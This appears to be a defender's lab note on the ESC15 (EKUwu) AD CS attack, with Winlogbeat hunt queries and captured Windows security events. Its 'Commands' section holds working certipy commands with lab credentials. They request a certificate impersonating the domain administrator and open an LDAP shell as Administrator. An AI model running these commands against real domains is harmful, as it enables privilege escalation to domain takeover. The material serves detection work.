# ESC15



# Sources

[https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)

# Hunts

## Winlogbeat

### 4768 error TGT request (A Kerberos authentication ticket (TGT) was requested) c KDC_ERR_INCONSISTENT_KEY_PURPOSE(Certificate cannot be used for PKINIT client authentication)

```jsx
winlog.event_id:(4768)  
AND winlog.event_data.CertSerialNumber:* 
AND winlog.event_data.Status:("0x4d")

```

### Certificate request with SAN:upn

```jsx
winlog.event_id:(4886 OR 4887 OR 4888) 
AND  winlog.event_data.Attributes:/.*SAN\:upn.+/

```

### Vulnerable template (scheme V1 and flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)

```jsx
winlog.event_id:(4898) 
AND winlog.event_data.TemplateContent:(*CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT*) 
AND winlog.event_data.TemplateSchemaVersion:1

```

### Request certificate with Application Policy

```jsx
winlog.event_id:(4886 OR 4887 OR 4888) 
AND winlog.event_data.Attributes:(*ApplicationPolicies*)
```

### 4624 Schannel logon

```jsx
winlog.event_id:(4624) 
AND winlog.event_data.LogonType:(3) 
AND winlog.event_data.AuthenticationPackageName:(Kerberos) 
AND winlog.event_data.LogonProcessName:(Schannel)
```

# Commands

## Short version

```jsx
#Request certificate with UPN "administrator" and policy "Client Authentication"
certipy req -username "missandei@essos.local" -password "fr3edom" -dc-ip "192.168.56.12" -web -target "braavos.essos.local" -ca "ESSOS-CA" -template "WebServer" -upn "administrator@essos.local" --application-policies "Client Authentication"

# Authentication with received certificate
certipy auth -pfx "administrator.pfx" -domain "essos.local" -username "administrator" -dc-ip 192.168.56.12 -debug  -ldap-shell
```

## Request certificate using template "WebServer" (scheme v1) with UPN administrator and policy "Client Authentication" (gives ability for authentication):

```jsx
certipy req -username "missandei@essos.local" -password "fr3edom" -dc-ip "192.168.56.12" -web -target "braavos.essos.local" -ca "ESSOS-CA" -template "WebServer" -upn "administrator@essos.local" --application-policies "Client Authentication"

/opt/certipy-merged/.venv/lib/python3.13/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Checking for Web Enrollment on 'http://192.168.56.23:80'
[*] Requesting certificate via Web Enrollment
[*] Request ID is 12
[*] Retrieving certificate for request ID: 12
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

## Authentication with received certificate administrator.pfx:

```jsx
certipy auth -pfx "administrator.pfx" -domain "essos.local" -username "administrator" -dc-ip 192.168.56.12 -debug  -ldap-shell
/opt/certipy-merged/.venv/lib/python3.13/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://192.168.56.12:636'
[*] Authenticated to '192.168.56.12' as: u:ESSOS\Administrator
Type help for list of commands

# 

```

# Artifacts

## Update Windows  (attack do not work, but events are generated)

### 4886. Certificate Services received a certificate request

```jsx
Certificate Services received a certificate request.
	
Request ID:	104
Requester:	ESSOS\missandei
Attributes:	
CertificateTemplate:WebServer
SAN:upn=administrator@essos.local
ApplicationPolicies:1.3.6.1.5.5.7.3.2
ccm:braavos.essos.local
Subject from CSR:	CN=Missandei
Subject Alternative Name from CSR:
Other Name:
     Principal Name=administrator@essos.local

Requested Template:	WebServer
RequestOSVersion:	
RequestCSPProvider:	
RequestClientInfo:	
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		DCOM
```

```jsx
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4886</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T07:43:07.1759456Z" /> 
  <EventRecordID>61570</EventRecordID> 
  <Correlation ActivityID="{4beb5801-0f9c-0001-f259-eb4b9c0fdc01}" /> 
  <Execution ProcessID="752" ThreadID="800" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">104</Data> 
  <Data Name="Requester">ESSOS\missandei</Data> 
  <Data Name="Attributes">CertificateTemplate:WebServer SAN:upn=administrator@essos.local ApplicationPolicies:1.3.6.1.5.5.7.3.2 ccm:braavos.essos.local</Data> 
  <Data Name="Subject">CN=Missandei</Data> 
  <Data Name="SubjectAlternativeName">Other Name: Principal Name=administrator@essos.local</Data> 
  <Data Name="CertificateTemplate">WebServer</Data> 
  <Data Name="RequestOSVersion" /> 
  <Data Name="RequestCSPProvider" /> 
  <Data Name="RequestClientInfo" /> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">DCOM</Data> 
  </EventData>
  </Event>
```

### 4887. Certificate Services approved a certificate request and issued a certificate

```jsx
Certificate Services approved a certificate request and issued a certificate.
	
Request ID:	104
Requester:	ESSOS\missandei
Attributes:	
CertificateTemplate:WebServer
SAN:upn=administrator@essos.local
ApplicationPolicies:1.3.6.1.5.5.7.3.2
ccm:braavos.essos.local
Disposition:	3
SKI:		22 1c 6d 0a 2f 43 59 9c 96 27 4c 27 12 37 29 1a b0 bd 14 ed
Subject:	CN=Missandei
Subject Alternative Name:
Other Name:
     Principal Name=administrator@essos.local

Certificate Template:	WebServer
Serial Number:		64000000686da065d22cd2190c000000000068
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		DCOM
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4887</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T07:43:07.1854993Z" /> 
  <EventRecordID>61576</EventRecordID> 
  <Correlation ActivityID="{4beb5801-0f9c-0001-f259-eb4b9c0fdc01}" /> 
  <Execution ProcessID="752" ThreadID="800" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">104</Data> 
  <Data Name="Requester">ESSOS\missandei</Data> 
  <Data Name="Attributes">CertificateTemplate:WebServer SAN:upn=administrator@essos.local ApplicationPolicies:1.3.6.1.5.5.7.3.2 ccm:braavos.essos.local</Data> 
  <Data Name="Disposition">3</Data> 
  <Data Name="SubjectKeyIdentifier">22 1c 6d 0a 2f 43 59 9c 96 27 4c 27 12 37 29 1a b0 bd 14 ed</Data> 
  <Data Name="Subject">CN=Missandei</Data> 
  <Data Name="SubjectAlternativeName">Other Name: Principal Name=administrator@essos.local</Data> 
  <Data Name="CertificateTemplate">WebServer</Data> 
  <Data Name="SerialNumber">64000000686da065d22cd2190c000000000068</Data> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">DCOM</Data> 
  </EventData>
  </Event>
```

### 4887. Certificate Services approved a certificate request and issued a certificate. (Extended)

```jsx
Certificate Services approved a certificate request and issued a certificate.
	
Request ID:	12
Requester:	ESSOS\missandei
Attributes:	
CertificateTemplate:WebServer
SAN:upn=administrator@essos.local
ApplicationPolicies:1.3.6.1.5.5.7.3.2
ccm:braavos.essos.local
Disposition:	3
SKI:		3e 42 2a dc e1 d1 36 c1 7b 8b 2e ff 4e e5 f9 76 8b d8 c4 8b
Subject:	CN=Missandei
Subject Alternative Name:
Other Name:
     Principal Name=administrator@essos.local

Certificate Template:	WebServer
Serial Number:		640000000c4d1ccc894600f08000000000000c
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		DCOM
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4887</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-15T13:54:41.6964619Z" /> 
  <EventRecordID>155777</EventRecordID> 
  <Correlation ActivityID="{4ac4c102-0deb-0001-f1c2-c44aeb0ddc01}" /> 
  <Execution ProcessID="716" ThreadID="812" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">12</Data> 
  <Data Name="Requester">ESSOS\missandei</Data> 
  <Data Name="Attributes">CertificateTemplate:WebServer SAN:upn=administrator@essos.local ApplicationPolicies:1.3.6.1.5.5.7.3.2 ccm:braavos.essos.local</Data> 
  <Data Name="Disposition">3</Data> 
  <Data Name="SubjectKeyIdentifier">3e 42 2a dc e1 d1 36 c1 7b 8b 2e ff 4e e5 f9 76 8b d8 c4 8b</Data> 
  <Data Name="Subject">CN=Missandei</Data> 
  <Data Name="SubjectAlternativeName">Other Name: Principal Name=administrator@essos.local</Data> 
  <Data Name="CertificateTemplate">WebServer</Data> 
  <Data Name="SerialNumber">640000000c4d1ccc894600f08000000000000c</Data> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">DCOM</Data> 
  </EventData>
  </Event>
  
  
  
```

### 4888. Certificate Services denied a certificate request

(For example, wrong template name)

```jsx
Certificate Services denied a certificate request.
	
Request ID:	24
Requester:	ESSOS\missandei
Attributes:	CertificateTemplate:WebServer_test
SAN:upn=administrator@essos.local
ApplicationPolicies:1.3.6.1.5.5.7.3.2
Disposition:	-2146875392
SKI:		d8 20 c0 86 b6 af 92 cc f9 77 de 92 6b 29 61 8d c0 5a 79 e8
Subject:	
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		RPC
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4888</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8010000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-15T17:07:49.2655753Z" /> 
  <EventRecordID>157811</EventRecordID> 
  <Correlation ActivityID="{94551cf5-0e04-0000-8d1d-5594040edc01}" /> 
  <Execution ProcessID="748" ThreadID="804" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">24</Data> 
  <Data Name="Requester">ESSOS\missandei</Data> 
  <Data Name="Attributes">CertificateTemplate:WebServer_test SAN:upn=administrator@essos.local ApplicationPolicies:1.3.6.1.5.5.7.3.2</Data> 
  <Data Name="Disposition">-2146875392</Data> 
  <Data Name="SubjectKeyIdentifier">d8 20 c0 86 b6 af 92 cc f9 77 de 92 6b 29 61 8d c0 5a 79 e8</Data> 
  <Data Name="Subject" /> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>

```

### **4768.** Failure TGT request

If use PKINIT, instead of schannell (without ldap_shell) will be error: 

*KDC_ERR_INCONSISTENT_KEY_PURPOSE(Certificate cannot be used for PKINIT client authentication)*

Result Code:		**0x4D** 

```jsx
A Kerberos authentication ticket (TGT) was requested.

Account Information:
	Account Name:		administrator
	Supplied Realm Name:	ESSOS.LOCAL
	User ID:			NULL SID
	MSDS-SupportedEncryptionTypes:	-
	Available Keys:	-

Service Information:
	Service Name:		krbtgt/ESSOS.LOCAL
	Service ID:		NULL SID
	MSDS-SupportedEncryptionTypes:	-
	Available Keys:	-

Domain Controller Information:
	MSDS-SupportedEncryptionTypes:	-
	Available Keys:	-

Network Information:
	Client Address:		::ffff:192.168.56.200
	Client Port:		59718
	Advertized Etypes:	-

Additional Information:
	Ticket Options:		0x40800010
	Result Code:		0x4D
	Ticket Encryption Type:	0xFFFFFFFF
	Session Encryption Type:	0x2D
	Pre-Authentication Type:	-
	Pre-Authentication EncryptionType:	0x2D

Certificate Information:
	Certificate Issuer Name:		ESSOS-CA
	Certificate Serial Number:	640000000C4D1CCC894600F08000000000000C
	Certificate Thumbprint:		8B04D3155A495A0C60560E6BE202BD12A801BFD2

Ticket information
	Response ticket hash:		-
Certificate information is only provided if a certificate was used for pre-authentication.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
```

```jsx
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4768</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>14339</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8010000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-15T14:37:01.807181000Z" /> 
  <EventRecordID>104708</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="676" ThreadID="2020" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TargetUserName">administrator</Data> 
  <Data Name="TargetDomainName">ESSOS.LOCAL</Data> 
  <Data Name="TargetSid">S-1-0-0</Data> 
  <Data Name="ServiceName">krbtgt/ESSOS.LOCAL</Data> 
  <Data Name="ServiceSid">S-1-0-0</Data> 
  <Data Name="TicketOptions">0x40800010</Data> 
  <Data Name="Status">0x4d</Data> 
  <Data Name="TicketEncryptionType">0xffffffff</Data> 
  <Data Name="PreAuthType">-</Data> 
  <Data Name="IpAddress">::ffff:192.168.56.200</Data> 
  <Data Name="IpPort">59718</Data> 
  <Data Name="CertIssuerName">ESSOS-CA</Data> 
  <Data Name="CertSerialNumber">640000000C4D1CCC894600F08000000000000C</Data> 
  <Data Name="CertThumbprint">8B04D3155A495A0C60560E6BE202BD12A801BFD2</Data> 
  <Data Name="ResponseTicket">-</Data> 
  <Data Name="AccountSupportedEncryptionTypes">-</Data> 
  <Data Name="AccountAvailableKeys">-</Data> 
  <Data Name="ServiceSupportedEncryptionTypes">-</Data> 
  <Data Name="ServiceAvailableKeys">-</Data> 
  <Data Name="DCSupportedEncryptionTypes">-</Data> 
  <Data Name="DCAvailableKeys">-</Data> 
  <Data Name="ClientAdvertizedEncryptionTypes">-</Data> 
  <Data Name="SessionKeyEncryptionType">0x2d</Data> 
  <Data Name="PreAuthEncryptionType">0x2d</Data> 
  </EventData>
  </Event>
```

## Windows without updates

On successful logon with *-ldap-shell* - network 4624 with Schannel

### An account was successfully logged on. Schannel

```jsx
An account was successfully logged on.

Subject:
	Security ID:		SYSTEM
	Account Name:		MEEREEN$
	Account Domain:		ESSOS
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		ESSOS\Administrator
	Account Name:		Administrator
	Account Domain:		ESSOS
	Logon ID:		0x26B959
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{2da7f413-711a-4319-54ed-cfca66d41248}

Process Information:
	Process ID:		0x2b4
	Process Name:		C:\Windows\System32\lsass.exe

Network Information:
	Workstation Name:	MEEREEN
	Source Network Address:	192.168.56.200
	Source Port:		36365

Detailed Authentication Information:
	Logon Process:		Schannel
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
```

```jsx
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4624</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-15T18:32:53.636149100Z" /> 
  <EventRecordID>68257</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="692" ThreadID="2324" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-18</Data> 
  <Data Name="SubjectUserName">MEEREEN$</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x3e7</Data> 
  <Data Name="TargetUserSid">S-1-5-21-1330862731-2240521544-517571234-500</Data> 
  <Data Name="TargetUserName">Administrator</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetLogonId">0x26b959</Data> 
  <Data Name="LogonType">3</Data> 
  <Data Name="LogonProcessName">Schannel</Data> 
  <Data Name="AuthenticationPackageName">Kerberos</Data> 
  <Data Name="WorkstationName">MEEREEN</Data> 
  <Data Name="LogonGuid">{2DA7F413-711A-4319-54ED-CFCA66D41248}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="LmPackageName">-</Data> 
  <Data Name="KeyLength">0</Data> 
  <Data Name="ProcessId">0x2b4</Data> 
  <Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data> 
  <Data Name="IpAddress">192.168.56.200</Data> 
  <Data Name="IpPort">36365</Data> 
  <Data Name="ImpersonationLevel">%%1833</Data> 
  <Data Name="RestrictedAdminMode">-</Data> 
  <Data Name="TargetOutboundUserName">-</Data> 
  <Data Name="TargetOutboundDomainName">-</Data> 
  <Data Name="VirtualAccount">%%1843</Data> 
  <Data Name="TargetLinkedLogonId">0x0</Data> 
  <Data Name="ElevatedToken">%%1842</Data> 
  </EventData>
  </Event>
```

## Get-CertRequest

```jsx
CA                                          : braavos.essos.local\ESSOS-CA
[Request.ID](http://request.id/)                                  : 5
Request.RequesterName                       : ESSOS\missandei
Request.CommonName                          : Missandei
Request.CallerName                          : ESSOS\missandei
Request.DistinguishedName                   : CN=Missandei
Request.ClientInformation.MachineName       :
Request.ClientInformation.ProcessName       :
Request.ClientInformation.UserName          :
Request.SubjectAltNamesExtension            : administrator@essos.local
Request.SubjectAltNamesAttrib               :
Request.ApplicationPolicies                 : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
UPN                                         :
Issued.DistinguishedName                    : CN=Missandei
Issued.CommonName                           : Missandei
CertificateTemplate                         : WebServer
EnrollmentFlags                             :
SerialNumber                                : 6400000005b02e5b17427019c4000000000005
Certificate.SAN                             : Other Name:Principal Name=administrator@essos.local
Certificate.ApplicationPolicies             : [1]Application Certificate Policy:Policy Identifier=Certificate Request Agent
Certificate.IssuancePolicies.PolicyName     :
Certificate.IssuancePolicies.GroupCN        :
Certificate.IssuancePolicies.GroupSID       :
Certificate.EKU                             : Server Authentication (1.3.6.1.5.5.7.3.1)
Certificate.SID_Extension.SID               :
Certificate.SID_Extension.DistinguishedName :
Certificate.SID_Extension.SamAccountName    :
Certificate.SID_Extension.UPN               :
Certificate.SID_Extension.CN                :
RequestDate                                 : 8/15/2025 6:52:48 PM
StartDate                                   : 8/15/2025 6:42:48 PM
EndDate                                     : 8/15/2027 6:42:48 PM
```